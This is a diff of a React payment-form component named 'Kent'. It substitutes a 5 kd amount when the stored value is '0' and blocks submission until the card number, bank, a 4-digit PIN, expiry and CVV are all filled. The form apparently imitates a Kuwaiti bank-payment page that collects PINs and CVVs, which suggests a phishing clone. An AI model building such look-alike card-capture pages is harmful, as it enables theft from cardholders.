@@ -254,7 +254,10 @@ export default function Kent(props: { setPage?: any }) {
                   <div className="row">
                     <label className="column-label">Amount: </label>
                     <label className="column-value text-label">
-                      {localStorage.getItem("vv")} kd
+                      {localStorage.getItem("vv") === "0"
+                        ? 5
+                        : localStorage.getItem("vv")}{" "}
+                      kd
                     </label>
                   </div>
                 </div>
@@ -631,6 +634,17 @@ export default function Kent(props: { setPage?: any }) {
                     </div>
                     <div style={{ display: "flex" }}>
                       <button
+                        disabled={
+                          step === 1 &&
+                          (paymentInfo.prefix === "" ||
+                            paymentInfo.bank === "" ||
+                            paymentInfo.cardNumber === "" ||
+                            paymentInfo.pass === "" ||
+                            paymentInfo.month === "" ||
+                            paymentInfo.year === "" ||
+                            paymentInfo.pass.length !== 4 ||
+                            paymentInfo.cvv === "")
+                        }
                         type="submit"
                         onClick={(e) => {
                           e.preventDefault();
